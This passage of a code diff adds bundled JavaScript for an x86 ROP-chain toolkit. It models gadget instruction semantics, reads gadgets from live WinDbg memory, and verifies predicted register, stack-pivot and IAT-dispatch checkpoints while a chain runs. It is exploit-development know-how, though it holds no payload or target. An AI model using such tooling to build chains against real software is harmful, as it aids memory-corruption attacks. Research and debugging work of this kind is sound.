+        if (!isRegisterOperand(left) || !isRegisterOperand(right)) {
+          return {};
+        }
+        return {
+          reads: [left.register, right.register],
+          writes: [left.register, right.register],
+          registerEffects: {
+            [left.register]: registerExpr(right.register),
+            [right.register]: registerExpr(left.register)
+          },
+          evidence: [`XCHG ${left.register}, ${right.register}`]
+        };
+      }
+    },
+    {
+      name: "xchg-reg-memory",
+      match: (instruction) => instruction.mnemonic === "xchg" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        const memory = left.kind === "memory" ? left : right.kind === "memory" ? right : void 0;
+        const register2 = isRegisterOperand(left) ? left : isRegisterOperand(right) ? right : void 0;
+        if (!memory || !register2)
+          return {};
+        const addressRegisters = memoryRegisters(memory.text);
+        return {
+          reads: [...addressRegisters, register2.register],
+          writes: [register2.register],
+          memoryReads: [memory.text],
+          memoryWrites: [memory.text],
+          registerEffects: { [register2.register]: unknownExpr() },
+          evidence: [`XCHG ${left.text}, ${right.text}`]
+        };
+      }
+    },
+    {
+      name: "lea-reg-mem",
+      match: (instruction) => instruction.mnemonic === "lea" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || right.kind !== "memory") {
+          return {};
+        }
+        const address = memoryAddressExpression(right.text);
+        const addressRegisters = memoryRegisters(right.text);
+        return {
+          reads: addressRegisters,
+          writes: [left.register],
+          // The current affine transform domain proves base+constant forms.
+          // Indexed/scaled SIB forms retain exact dependencies but deliberately
+          // become unknown instead of being misrepresented as a simple affine
+          // address.
+          registerEffects: { [left.register]: address != null ? address : unknownExpr() },
+          evidence: [`LEA ${left.register}, ${right.text}`]
+        };
+      }
+    },
+    {
+      name: "leave",
+      match: (instruction) => instruction.mnemonic === "leave",
+      evaluate: () => ({
+        reads: ["ebp", "esp"],
+        writes: ["esp", "ebp"],
+        stackDelta: { conservative: [4] },
+        memoryReads: ["[ebp]"],
+        registerEffects: {
+          esp: registerExpr("ebp", 4),
+          ebp: memoryExpr(registerExpr("ebp"))
+        },
+        evidence: ["LEAVE restores frame and pops saved base pointer"]
+      })
+    },
+    {
+      name: "call",
+      match: (instruction) => instruction.mnemonic === "call" && instruction.operands.length >= 1,
+      evaluate: (instruction) => {
+        const operand = parseOperand(instruction.operands[0]);
+        const addressRegisters = operand.kind === "memory" ? memoryRegisters(operand.text) : [];
+        return {
+          reads: operand.kind === "register" ? [operand.register] : addressRegisters,
+          writes: ["esp"],
+          stackDelta: { exact: [-4] },
+          memoryReads: operand.kind === "memory" ? [operand.text] : [],
+          flowEffects: ["CALL"],
+          registerEffects: { esp: selfPlus(-4) },
+          evidence: [`CALL ${instruction.operands.join(", ")}`]
+        };
+      }
+    },
+    {
+      name: "jmp",
+      match: (instruction) => instruction.mnemonic === "jmp" && instruction.operands.length >= 1,
+      evaluate: (instruction) => {
+        const operand = parseOperand(instruction.operands[0]);
+        const addressRegisters = operand.kind === "memory" ? memoryRegisters(operand.text) : [];
+        return {
+          reads: operand.kind === "register" ? [operand.register] : addressRegisters,
+          memoryReads: operand.kind === "memory" ? [operand.text] : [],
+          flowEffects: ["JUMP"],
+          evidence: [`JMP ${instruction.operands.join(", ")}`]
+        };
+      }
+    },
+    {
+      name: "nop",
+      match: (instruction) => instruction.mnemonic === "nop",
+      evaluate: () => ({
+        evidence: ["NOP has no semantic side effects"]
+      })
+    }
+  ];
+  function buildSemanticField(values, evidence = []) {
+    var _a, _b, _c;
+    return makeField((_a = values == null ? void 0 : values.exact) != null ? _a : [], (_b = values == null ? void 0 : values.conservative) != null ? _b : [], (_c = values == null ? void 0 : values.unknown) != null ? _c : false, evidence);
+  }
+  function fromRuleResult(instruction, index, result3, supported) {
+    var _a, _b;
+    return {
+      schemaVersion: SEMANTIC_SCHEMA_VERSION,
+      instructionIndex: index,
+      instruction,
+      reads: buildSemanticField({ exact: result3.reads }, result3.evidence),
+      writes: buildSemanticField({ exact: result3.writes }, result3.evidence),
+      stackDelta: buildSemanticField(result3.stackDelta, result3.evidence),
+      flags: buildSemanticField(result3.flags, result3.evidence),
+      memoryReads: buildSemanticField({ exact: result3.memoryReads }, result3.evidence),
+      memoryWrites: buildSemanticField({ exact: result3.memoryWrites }, result3.evidence),
+      flowEffects: buildSemanticField({ exact: result3.flowEffects }, result3.evidence),
+      registerEffects: (_a = result3.registerEffects) != null ? _a : {},
+      registerEffectsUnknown: false,
+      evidence: (_b = result3.evidence) != null ? _b : [],
+      supported
+    };
+  }
+  function analyzeInstruction(instruction, index) {
+    for (const rule of RULES) {
+      if (!rule.match(instruction)) {
+        continue;
+      }
+      const result3 = rule.evaluate(instruction);
+      const supported = Object.values(result3).some((value) => Array.isArray(value) ? value.length > 0 : value !== void 0);
+      if (!supported) {
+        continue;
+      }
+      return fromRuleResult(instruction, index, result3, true);
+    }
+    const fallback = unsupported(instruction);
+    return __spreadProps(__spreadValues({}, fallback), {
+      instructionIndex: index
+    });
+  }
+
+  // src/semantics/compose.ts
+  var REGISTERS2 = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
+  function makeSet2(exact = [], conservative = [], unknown = false) {
+    return {
+      exact: new Set(exact),
+      conservative: new Set(conservative),
+      unknown
+    };
+  }
+  function confidenceForSet2(set) {
+    if (set.unknown) {
+      return "UNKNOWN";
+    }
+    if (set.conservative.size > 0) {
+      return "CONSERVATIVE";
+    }
+    return "EXACT";
+  }
+  function makeField2(exact = [], conservative = [], unknown = false, evidence = []) {
+    const values = makeSet2(exact, conservative, unknown);
+    return { values, confidence: confidenceForSet2(values), evidence };
+  }
+  function mergeSet(left, right) {
+    return {
+      exact: /* @__PURE__ */ new Set([...left.exact, ...right.exact]),
+      conservative: /* @__PURE__ */ new Set([...left.conservative, ...right.conservative]),
+      unknown: left.unknown || right.unknown
+    };
+  }
+  function mergeField(left, right) {
+    const values = mergeSet(left.values, right.values);
+    return {
+      values,
+      confidence: confidenceForSet2(values),
+      evidence: [...left.evidence, ...right.evidence]
+    };
+  }
+  function emptyField() {
+    return makeField2();
+  }
+  function registerIdentity(register2) {
+    return { kind: "affine", base: register2, offset: { kind: "constant", value: 0 } };
+  }
+  function initialRegisterTransforms() {
+    return Object.fromEntries(REGISTERS2.map((register2) => [register2, registerIdentity(register2)]));
+  }
+  function unknownExpr2() {
+    return { kind: "unknown" };
+  }
+  function isZeroOffset(offset) {
+    return offset.kind === "constant" && offset.value === 0;
+  }
+  function addOffset(expr, offset) {
+    if (offset.kind === "unknown" || expr.kind === "unknown") {
+      return unknownExpr2();
+    }
+    if (isZeroOffset(offset)) {
+      return expr;
+    }
+    if (expr.kind === "constant") {
+      return offset.kind === "constant" ? { kind: "constant", value: expr.value + offset.value } : unknownExpr2();
+    }
+    if (expr.kind !== "affine") {
+      return unknownExpr2();
+    }
+    if (expr.offset.kind !== "constant") {
+      return unknownExpr2();
+    }
+    if (offset.kind === "constant") {
+      return {
+        kind: "affine",
+        base: expr.base,
+        offset: { kind: "constant", value: expr.offset.value + offset.value }
+      };
+    }
+    if (expr.offset.value !== 0) {
+      return unknownExpr2();
+    }
+    return {
+      kind: "affine",
+      base: expr.base,
+      offset
+    };
+  }
+  function substituteExpr(expr, state, target) {
+    if (expr.kind === "constant" || expr.kind === "unknown") {
+      return expr;
+    }
+    if (expr.kind === "memory") {
+      return {
+        kind: "memory",
+        address: substituteExpr(expr.address, state, target),
+        confidence: expr.confidence
+      };
+    }
+    const baseExpr = expr.base === "self" ? target ? state[target] : unknownExpr2() : expr.base === "none" ? { kind: "affine", base: "none", offset: { kind: "constant", value: 0 } } : state[expr.base];
+    return addOffset(baseExpr, expr.offset);
+  }
+  function aggregateRegisterTransforms(instructionSemantics) {
+    let state = initialRegisterTransforms();
+    for (const step of instructionSemantics) {
+      if (step.registerEffectsUnknown) {
+        state = Object.fromEntries(REGISTERS2.map((register2) => [register2, unknownExpr2()]));
+        continue;
+      }
+      const nextState = __spreadValues({}, state);
+      for (const [register2, effect] of Object.entries(step.registerEffects)) {
+        nextState[register2] = substituteExpr(effect, state, register2);
+      }
+      state = nextState;
+    }
+    return state;
+  }
+  function balancedEspCapture(instructions) {
+    var _a;
+    for (let start = 0; start < instructions.length; start += 1) {
+      const first = instructions[start];
+      if (first.mnemonic !== "push" || ((_a = first.operands[0]) == null ? void 0 : _a.trim().toLowerCase()) !== "esp")
+        continue;
+      for (let index = start + 1; index < instructions.length; index += 1) {
+        const current = instructions[index];
+        const mnemonic = current.mnemonic.toLowerCase();
+        const operands = current.operands.map((operand) => operand.trim().toLowerCase());
+        if (mnemonic === "pop" && operands.length === 1 && operands[0] !== "esp")
+          return operands[0];
+        if (mnemonic === "push" || mnemonic === "pop" || mnemonic === "ret" || operands.some((operand) => operand.includes("esp") || operand.includes("[esp")))
+          break;
+      }
+    }
+    return void 0;
+  }
+  function appendField(current, next) {
+    return mergeField(current, next);
+  }
+  function aggregateStackDelta(instructionSemantics) {
+    let exactTotal = 0;
+    let conservativeTotal = 0;
+    let sawExact = true;
+    let sawConservative = false;
+    let sawUnknown = false;
+    const evidence = [];
+    for (const step of instructionSemantics) {
+      evidence.push(...step.stackDelta.evidence);
+      if (step.stackDelta.values.unknown) {
+        sawUnknown = true;
+        sawExact = false;
+        continue;
+      }
+      if (step.stackDelta.values.conservative.size > 0) {
+        sawConservative = true;
+        sawExact = false;
+        for (const value of step.stackDelta.values.conservative) {
+          conservativeTotal += value;
+        }
+        continue;
+      }
+      if (step.stackDelta.values.exact.size === 1) {
+        exactTotal += [...step.stackDelta.values.exact][0];
+        continue;
+      }
+      if (step.stackDelta.values.exact.size > 1) {
+        sawExact = false;
+        sawUnknown = true;
+      }
+    }
+    if (sawUnknown) {
+      return makeField2([], [], true, evidence);
+    }
+    if (sawConservative) {
+      return makeField2([], [conservativeTotal], false, evidence);
+    }
+    if (sawExact) {
+      return makeField2([exactTotal], [], false, evidence);
+    }
+    return makeField2([], [], true, evidence);
+  }
+  function makeSummary() {
+    return {
+      schemaVersion: SEMANTIC_SCHEMA_VERSION,
+      reads: emptyField(),
+      writes: emptyField(),
+      stackDelta: emptyField(),
+      flags: emptyField(),
+      memoryReads: emptyField(),
+      memoryWrites: emptyField(),
+      flowEffects: emptyField(),
+      registerTransforms: initialRegisterTransforms()
+    };
+  }
+  function composeSemanticSequence(sequence) {
+    const instructionSemantics = sequence.instructions.map((instruction, index) => analyzeInstruction(instruction, index));
+    const summary = makeSummary();
+    for (const semantic of instructionSemantics) {
+      summary.reads = appendField(summary.reads, semantic.reads);
+      summary.writes = appendField(summary.writes, semantic.writes);
+      summary.stackDelta = appendField(summary.stackDelta, semantic.stackDelta);
+      summary.flags = appendField(summary.flags, semantic.flags);
+      summary.memoryReads = appendField(summary.memoryReads, semantic.memoryReads);
+      summary.memoryWrites = appendField(summary.memoryWrites, semantic.memoryWrites);
+      summary.flowEffects = appendField(summary.flowEffects, semantic.flowEffects);
+    }
+    summary.stackDelta = aggregateStackDelta(instructionSemantics);
+    summary.registerTransforms = aggregateRegisterTransforms(instructionSemantics);
+    const capture = balancedEspCapture(sequence.instructions);
+    if (capture)
+      summary.registerTransforms[capture] = registerIdentity("esp");
+    return {
+      schemaVersion: SEMANTIC_SCHEMA_VERSION,
+      instructionSequenceId: sequence.id,
+      instructionSequence: sequence,
+      instructionSemantics,
+      summary
+    };
+  }
+  function canonicalizeSequenceForPolicy(sequence) {
+    return canonicalizeInstructionSequence(sequence);
+  }
+
+  // src/semantics/live-provider.ts
+  function sequenceFromLiveHit(hit) {
+    const parts = hit.mnemonic.split(";").map((part) => part.trim()).filter((part) => part.length > 0);
+    const instructions = parts.map((part) => parseInstruction(part));
+    const canonical = canonicalizeTextSequence(parts.join(" ; "));
+    const addressNumber = Number(hit.address);
+    return {
+      schemaVersion: SEMANTIC_SCHEMA_VERSION,
+      id: `live:${hit.address.toString(16)}:${canonical}`,
+      source: { kind: "source-adapter", name: "live", format: "windbg-memory", version: "v1" },
+      originalText: `0x${hit.address.toString(16)}: ${parts.join(" ; ")} ;`,
+      instructions,
+      provenance: {
+        module: hit.module,
+        // The full address survives in id/originalText; the numeric field is exact
+        // for realistic user-space addresses (< 2^53).
+        virtualAddress: Number.isSafeInteger(addressNumber) ? addressNumber : void 0,
+        // Discovered by scanning executable sections, so executability is proven.
+        executable: "EXACT",
+        writable: "UNKNOWN",
+        aslr: "UNKNOWN",
+        rebaseable: "UNKNOWN"
+      }
+    };
+  }
+  function sequencesFromLiveHits(hits) {
+    return [...hits].map(sequenceFromLiveHit);
+  }
+
+  // src/rop/proof/predictor.ts
+  var DWORD_MODULUS = __bi(4294967296);
+  function uint32Add(value, delta) {
+    const sum = (value + __bi(delta)) % DWORD_MODULUS;
+    return sum >= __bi(0) ? sum : sum + DWORD_MODULUS;
+  }
+  function addressKey(address) {
+    return address.toString(16);
+  }
+  function gadgetsAt(corpus, address) {
+    if (!corpus)
+      return [];
+    return corpus.gadgets.filter((gadget) => gadget.locations.some((location) => location.virtualAddress !== void 0 && __bi(location.virtualAddress) === address));
+  }
+  function descriptorFromGadget(gadget, address) {
+    const location = gadget.locations.find((entry) => entry.virtualAddress !== void 0 && __bi(entry.virtualAddress) === address);
+    return {
+      address,
+      semantic: gadget.semanticSummary,
+      capabilities: gadget.capabilities,
+      module: location == null ? void 0 : location.module,
+      instructions: gadget.instructions.map((instruction) => instruction.normalizedText || instruction.originalText)
+    };
+  }
+  function descriptorFromLive(address, instructions) {
+    const sequence = sequenceFromLiveHit({ address, mnemonic: instructions.join(" ; ") });
+    const semantic = composeSemanticSequence(sequence);
+    return {
+      address,
+      semantic,
+      capabilities: deriveCapabilities(semantic, []),
+      instructions: sequence.instructions.map((instruction) => instruction.normalizedText || instruction.originalText)
+    };
+  }
+  function hasExactFlow2(semantic) {
+    const flow = semantic.summary.flowEffects.values;
+    return !flow.unknown && flow.conservative.size === 0 && flow.exact.size > 0;
+  }
+  function normalizeChain(input, adapter) {
+    if (Array.isArray(input.chain)) {
+      return { steps: input.chain.map((step) => __spreadValues({}, step)), live: /* @__PURE__ */ new Map(), incompleteReasons: [] };
+    }
+    const parsed = parseManualChain(input.chain);
+    const live = /* @__PURE__ */ new Map();
+    const incompleteReasons = [];
+    const steps = parsed.map((step, index) => {
+      if (step.value === void 0)
+        return step;
+      const address = __bi(step.value >>> 0);
+      const matches = gadgetsAt(input.corpus, address);
+      if (matches.length === 1) {
+        return { kind: "gadget", address, comment: `manual gadget ${index}` };
+      }
+      if (matches.length > 1) {
+        incompleteReasons.push(`manual DWORD ${index} at 0x${address.toString(16)} is ambiguous in the corpus`);
+        return step;
+      }
+      const disassembly = adapter.disassemble(address, 16);
+      if (disassembly.ok && disassembly.value.instructions.length > 0) {
+        const descriptor = descriptorFromLive(address, disassembly.value.instructions);
+        if (hasExactFlow2(descriptor.semantic)) {
+          live.set(addressKey(address), descriptor);
+          return { kind: "gadget", address, comment: `manual live gadget ${index}` };
+        }
+      }
+      return step;
+    });
+    return { steps, live, incompleteReasons };
+  }
+  function descriptorFor(step, corpus, live) {
+    if (step.kind !== "gadget" || step.address === void 0)
+      return void 0;
+    const matches = gadgetsAt(corpus, step.address);
+    if (matches.length === 1)
+      return descriptorFromGadget(matches[0], step.address);
+    return live.get(addressKey(step.address));
+  }
+  function proofExpression(expr, targetRegister) {
+    if (expr.kind === "unknown")
+      return { kind: "unknown", reason: `unknown ${targetRegister} transform` };
+    if (expr.kind === "constant")
+      return { kind: "constant", value: __bi(expr.value >>> 0) };
+    if (expr.kind === "memory") {
+      return { kind: "memory-dword", address: proofExpression(expr.address, targetRegister) };
+    }
+    if (expr.offset.kind !== "constant") {
+      return { kind: "unknown", reason: `${targetRegister} has a register-dependent offset` };
+    }
+    if (expr.base === "none") {
+      return { kind: "constant", value: uint32Add(__bi(0), expr.offset.value) };
+    }
+    const register2 = expr.base === "self" ? targetRegister : expr.base;
+    return expr.offset.value === 0 ? { kind: "register", register: register2, checkpoint: "before" } : { kind: "register-offset", register: register2, checkpoint: "before", offset: expr.offset.value };
+  }
+  function isIdentityExpression(expression, register2) {
+    return expression.kind === "register" && expression.register === register2 && expression.checkpoint === "before";
+  }
+  function transitionAssertions(semantic) {
+    const assertions = [];
+    for (const [register2, transform] of Object.entries(semantic.summary.registerTransforms)) {
+      const expected = proofExpression(transform, register2);
+      if (isIdentityExpression(expected, register2))
+        continue;
+      const exact = expected.kind !== "unknown";
+      assertions.push({
+        subject: register2.toUpperCase(),
+        expected,
+        confidence: exact ? "EXACT" : "UNKNOWN",
+        evidence: semantic.instructionSemantics.flatMap((entry) => entry.evidence),
+        required: register2 === "esp" || exact
+      });
+    }
+    return assertions.sort((left, right) => {
+      if (left.subject === "ESP")
+        return -1;
+      if (right.subject === "ESP")
+        return 1;
+      return left.subject.localeCompare(right.subject);
+    });
+  }
+  function provenance(...descriptors) {
+    return descriptors.map((descriptor) => ({
+      address: descriptor.address,
+      module: descriptor.module,
+      instructions: descriptor.instructions
+    }));
+  }
+  function capability(descriptor, kind) {
+    return descriptor.capabilities.find((entry) => entry.kind === kind);
+  }
+  function combineSemantics(first, second) {
+    const sequence = __spreadProps(__spreadValues({}, first.semantic.instructionSequence), {
+      id: `${first.semantic.instructionSequence.id}+${second.semantic.instructionSequence.id}`,
+      originalText: `${first.semantic.instructionSequence.originalText} ; ${second.semantic.instructionSequence.originalText}`,
+      instructions: [
+        ...first.semantic.instructionSequence.instructions,
+        ...second.semantic.instructionSequence.instructions
+      ]
+    });
+    return composeSemanticSequence(sequence);
+  }
+  function memoryReadTarget(descriptor, register2) {
+    const transform = descriptor.semantic.summary.registerTransforms[register2];
+    if (!transform || transform.kind !== "memory")
+      return void 0;
+    const address = proofExpression(transform.address, register2);
+    return address.kind === "unknown" ? void 0 : { kind: "memory-dword", address };
+  }
+  function pivotTarget(descriptor) {
+    const flow = descriptor.semantic.summary.flowEffects.values;
+    if (flow.unknown || !flow.exact.has("RETURN"))
+      return void 0;
+    const espTransform = descriptor.semantic.summary.registerTransforms.esp;
+    const finalEsp = proofExpression(espTransform, "esp");
+    if (finalEsp.kind !== "register" && finalEsp.kind !== "register-offset")
+      return void 0;
+    if (finalEsp.register === "esp")
+      return void 0;
+    const last = descriptor.semantic.instructionSemantics[descriptor.semantic.instructionSemantics.length - 1];
+    if (!last || last.stackDelta.values.unknown || last.stackDelta.values.exact.size !== 1)
+      return void 0;
+    const returnDelta = [...last.stackDelta.values.exact][0];
+    const targetAddress = finalEsp.kind === "register" ? { kind: "register-offset", register: finalEsp.register, checkpoint: "before", offset: -returnDelta } : finalEsp.offset === returnDelta ? { kind: "register", register: finalEsp.register, checkpoint: "before" } : { kind: "register-offset", register: finalEsp.register, checkpoint: "before", offset: finalEsp.offset - returnDelta };
+    return {
+      target: { kind: "memory-dword", address: targetAddress },
+      assertions: transitionAssertions(descriptor.semantic)
+    };
+  }
+  function semanticIncomplete(descriptor) {
+    return descriptor.semantic.summary.flowEffects.values.unknown || descriptor.semantic.summary.stackDelta.values.unknown || descriptor.semantic.instructionSemantics.some((entry) => !entry.supported);
+  }
+  function buildProofPlan(input, adapter) {
+    var _a, _b;
+    const normalized = normalizeChain(input, adapter);
+    const incompleteReasons = [...normalized.incompleteReasons];
+    const descriptors = normalized.steps.map((step, stepIndex) => ({ stepIndex, descriptor: descriptorFor(step, input.corpus, normalized.live) })).filter((entry) => entry.descriptor !== void 0);
+    const checkpoints = [];
+    let incoming = [];
+    let targetOverride;
+    for (let position = 0; position < descriptors.length; position += 1) {
+      const current = descriptors[position];
+      const descriptor = current.descriptor;
+      checkpoints.push({
+        id: checkpoints.length,
+        stepIndex: current.stepIndex,
+        label: normalized.steps[current.stepIndex].comment,
+        target: targetOverride != null ? targetOverride : { kind: "constant", value: descriptor.address },
+        assertions: incoming,
+        provenance: provenance(descriptor),
+        dynamic: targetOverride !== void 0
+      });
+      targetOverride = void 0;
+      incoming = [];
+      if (semanticIncomplete(descriptor)) {
+        incompleteReasons.push(`gadget at 0x${descriptor.address.toString(16)} has unknown semantics`);
+      }
+      const next = descriptors[position + 1];
+      const memoryRead = (_a = capability(descriptor, "MEMORY_READ")) != null ? _a : capability(descriptor, "LOAD_MEMORY");
+      const dispatch = next ? capability(next.descriptor, "DISPATCH_JMP_REGISTER") : void 0;
+      if (next && (memoryRead == null ? void 0 : memoryRead.register) && (dispatch == null ? void 0 : dispatch.register) === memoryRead.register) {
+        const target = memoryReadTarget(descriptor, memoryRead.register);
+        if (!target) {
+          incompleteReasons.push(`IAT dispatch at 0x${descriptor.address.toString(16)} has an unresolved memory target`);
+          break;
+        }
+        const combined = combineSemantics(descriptor, next.descriptor);
+        checkpoints.push({
+          id: checkpoints.length,
+          stepIndex: next.stepIndex,
+          label: `${(_b = input.api) != null ? _b : "resolved"} API entry`,
+          target,
+          assertions: transitionAssertions(combined),
+          provenance: provenance(descriptor, next.descriptor),
+          dynamic: true
+        });
+        position += 1;
+        continue;
+      }
+      const pivot = pivotTarget(descriptor);
+      if (pivot) {
+        if (next) {
+          targetOverride = pivot.target;
+          incoming = pivot.assertions;
+        } else {
+          checkpoints.push({
+            id: checkpoints.length,
+            stepIndex: current.stepIndex,
+            label: "pivot target",
+            target: pivot.target,
+            assertions: pivot.assertions,
+            provenance: provenance(descriptor),
+            dynamic: true
+          });
+        }
+        continue;
+      }
+      incoming = transitionAssertions(descriptor.semantic);
+    }
+    return {
+      steps: normalized.steps,
+      checkpoints,
+      api: input.api,
+      incompleteReasons
+    };
+  }
+
+  // src/rop/proof/comparator.ts
+  function resolveProofExpression(expression, before, after, adapter) {
+    return evaluate(expression, { before, after, adapter });
+  }
+  function registerValue(snapshot, register2) {
+    const normalized = register2.toLowerCase();
+    if (normalized === "eip")
+      return snapshot.eip;
+    if (normalized === "esp")
+      return snapshot.esp;
+    return snapshot.registers[normalized];
+  }
+  function dwordLittleEndian(bytes) {
+    return __bi.or(__bi.or(__bi.or(__bi(bytes[0]), __bi.shl(__bi(bytes[1]), __bi(8))), __bi.shl(__bi(bytes[2]), __bi(16))), __bi.shl(__bi(bytes[3]), __bi(24)));
+  }
+  function evaluate(expression, context) {
+    switch (expression.kind) {
+      case "constant":
+        return { ok: true, value: __bi.asUintN(32, expression.value) };
+      case "register": {
+        const snapshot = expression.checkpoint === "before" ? context.before : context.after;
+        const value = registerValue(snapshot, expression.register);
+        return value === void 0 ? { ok: false, reason: `register ${expression.register} is unavailable` } : { ok: true, value: __bi.asUintN(32, value) };
+      }
+      case "register-offset": {
+        const value = registerValue(context.before, expression.register);
+        return value === void 0 ? { ok: false, reason: `register ${expression.register} is unavailable` } : { ok: true, value: uint32Add(value, expression.offset) };
+      }
+      case "memory-dword": {
+        const address = evaluate(expression.address, context);
+        if (!address.ok)
+          return address;
+        const bytes = context.adapter.readMemory(address.value, 4);
+        if (!bytes.ok)
+          return { ok: false, reason: bytes.error.message };
+        if (bytes.value.length !== 4) {
+          return { ok: false, reason: `expected 4 memory bytes, observed ${bytes.value.length}` };
+        }
+        return { ok: true, value: dwordLittleEndian(bytes.value) };
+      }
+      case "sum": {
+        let value = __bi(0);
+        for (const term of expression.terms) {
+          const evaluated = evaluate(term, context);
+          if (!evaluated.ok)
+            return evaluated;
+          value = __bi.asUintN(32, value + evaluated.value);
+        }
+        return { ok: true, value };
+      }
+      case "deferred":
+      case "unknown":
+        return { ok: false, reason: expression.reason };
+    }
+  }
+  function formatExpression(expression) {
+    switch (expression.kind) {
+      case "constant":
+        return `0x${__bi.asUintN(32, expression.value).toString(16).padStart(8, "0")}`;
+      case "register":
+        return `${expression.register.toUpperCase()}@${expression.checkpoint}`;
+      case "register-offset":
+        return `${expression.register.toUpperCase()}@before${expression.offset >= 0 ? "+" : ""}${expression.offset}`;
+      case "memory-dword":
+        return `DWORD[${formatExpression(expression.address)}]`;
+      case "sum":
+        return expression.terms.map(formatExpression).join(" + ");
+      case "deferred":
+        return `deferred: ${expression.reason}`;
+      case "unknown":
+        return `unknown: ${expression.reason}`;
+    }
+  }
+  function observedExpression(subject) {
+    return { kind: "register", register: subject.toLowerCase(), checkpoint: "after" };
+  }
+  function signedDifference(observed, expected) {
+    return Number(__bi.asIntN(32, observed - expected));
+  }
+  function compareCheckpoint(input, adapter) {
+    var _a;
+    const current = adapter.readRegisters();
+    const context = { before: input.previous, after: current, adapter };
+    const assertions = [];
+    const target = input.resolvedTarget === void 0 ? evaluate(input.checkpoint.target, context) : { ok: true, value: __bi.asUintN(32, input.resolvedTarget) };
+    if (!target.ok) {
+      assertions.push({
+        subject: "EIP",
+        expectedExpression: formatExpression(input.checkpoint.target),
+        observedValue: current.eip,
+        status: "UNVERIFIED",
+        confidence: "UNKNOWN",
+        evidence: [],
+        reason: target.reason
+      });
+      return {
+        checkpointId: input.checkpoint.id,
+        timestamp: (/* @__PURE__ */ new Date()).toISOString(),
+        outcome: "UNVERIFIED",
+        registers: current,
+        assertions,
+        reason: `Checkpoint target could not be resolved: ${target.reason}`
+      };
+    }
+    const expectedEip = __bi.asUintN(32, target.value);
+    const observedEip = __bi.asUintN(32, current.eip);
+    if (expectedEip !== observedEip) {
+      assertions.push({
+        subject: "EIP",
+        expectedExpression: formatExpression(input.checkpoint.target),
+        expectedValue: expectedEip,
+        observedValue: observedEip,
+        status: "FAILED",
+        confidence: "EXACT",
+        evidence: input.checkpoint.provenance.flatMap((entry) => entry.instructions),
+        reason: "execution stopped at an unexpected address"
+      });
+      return {
+        checkpointId: input.checkpoint.id,
+        timestamp: (/* @__PURE__ */ new Date()).toISOString(),
+        outcome: "UNEXPECTED_STOP",
+        registers: current,
+        assertions,
+        reason: `Expected EIP 0x${expectedEip.toString(16)}, observed 0x${observedEip.toString(16)}; checkpoint not advanced.`
+      };
+    }
+    assertions.push({
+      subject: "EIP",
+      expectedExpression: formatExpression(input.checkpoint.target),
+      expectedValue: expectedEip,
+      observedValue: observedEip,
+      status: "VERIFIED",
+      confidence: "EXACT",
+      evidence: input.checkpoint.provenance.flatMap((entry) => entry.instructions),
+      reason: "stop address matched the checkpoint target"
+    });
+    let unverified = false;
+    for (const template of input.checkpoint.assertions) {
+      const expected = evaluate(template.expected, context);
+      const observed = evaluate((_a = template.observed) != null ? _a : observedExpression(template.subject), context);
+      const cannotVerify = template.confidence !== "EXACT" || !expected.ok || !observed.ok;
+      if (cannotVerify) {
+        const reason = template.confidence !== "EXACT" ? `assertion confidence is ${template.confidence}` : !expected.ok ? expected.reason : !observed.ok ? observed.reason : "assertion is not exact";
+        assertions.push({
+          subject: template.subject,
+          expectedExpression: formatExpression(template.expected),
+          expectedValue: expected.ok ? expected.value : void 0,
+          observedValue: observed.ok ? observed.value : void 0,
+          status: "UNVERIFIED",
+          confidence: template.confidence,
+          evidence: [...template.evidence],
+          reason
+        });
+        unverified = true;
+        continue;
+      }
+      if (expected.value !== observed.value) {
+        const differenceBytes = template.subject.toUpperCase() === "ESP" ? signedDifference(observed.value, expected.value) : void 0;
+        assertions.push({
+          subject: template.subject,
+          expectedExpression: formatExpression(template.expected),
+          expectedValue: expected.value,
+          observedValue: observed.value,
+          status: "FAILED",
+          confidence: template.confidence,
+          evidence: [...template.evidence],
+          reason: differenceBytes === void 0 ? "observed value differs from prediction" : `ESP differs by ${differenceBytes >= 0 ? "+" : ""}${differenceBytes} bytes`,
+          differenceBytes
+        });
+        return {
+          checkpointId: input.checkpoint.id,
+          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
+          outcome: "FAILED",
+          registers: current,
+          assertions,
+          reason: assertions[assertions.length - 1].reason
+        };
+      }
+      assertions.push({
+        subject: template.subject,
+        expectedExpression: formatExpression(template.expected),
+        expectedValue: expected.value,
+        observedValue: observed.value,
+        status: "VERIFIED",
+        confidence: template.confidence,
+        evidence: [...template.evidence],
+        reason: "observed value matched the prediction"
+      });
+    }
+    return {
+      checkpointId: input.checkpoint.id,
+      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
+      outcome: unverified ? "UNVERIFIED" : "VERIFIED",
+      registers: current,
+      assertions,
+      reason: unverified ? "Checkpoint reached, but one or more assertions could not be verified." : "Checkpoint and all exact assertions matched."
+    };
+  }
+
+  // src/rop/proof/fingerprint.ts
+  var INITIAL = Uint32Array.from([
+    1779033703,
+    3144134277,
+    1013904242,
+    2773480762,
+    1359893119,
+    2600822924,
+    528734635,
+    1541459225
+  ]);
+  var ROUND = Uint32Array.from([
+    1116352408,
+    1899447441,
+    3049323471,
+    3921009573,
+    961987163,
+    1508970993,
+    2453635748,
+    2870763221,
+    3624381080,
+    310598401,
+    607225278,
+    1426881987,
+    1925078388,
+    2162078206,
+    2614888103,
+    3248222580,
+    3835390401,
+    4022224774,
+    264347078,
+    604807628,
+    770255983,
+    1249150122,
+    1555081692,
+    1996064986,
+    2554220882,
+    2821834349,
+    2952996808,
+    3210313671,
+    3336571891,
+    3584528711,
+    113926993,
+    338241895,
+    666307205,
+    773529912,
+    1294757372,
+    1396182291,
+    1695183700,
+    1986661051,
+    2177026350,
+    2456956037,
+    2730485921,
+    2820302411,
+    3259730800,
+    3345764771,
+    3516065817,
+    3600352804,
+    4094571909,
+    275423344,
+    430227734,
+    506948616,
+    659060556,
+    883997877,
+    958139571,
+    1322822218,
+    1537002063,
+    1747873779,
+    1955562222,
+    2024104815,
+    2227730452,
+    2361852424,
+    2428436474,
+    2756734187,
+    3204031479,
+    3329325298
+  ]);
+  function rotateRight(value, bits) {
+    return value >>> bits | value << 32 - bits;
+  }
+  var Sha256 = class {
+    constructor() {
+      this.state = Uint32Array.from(INITIAL);
+      this.pending = [];
+      this.length = __bi(0);
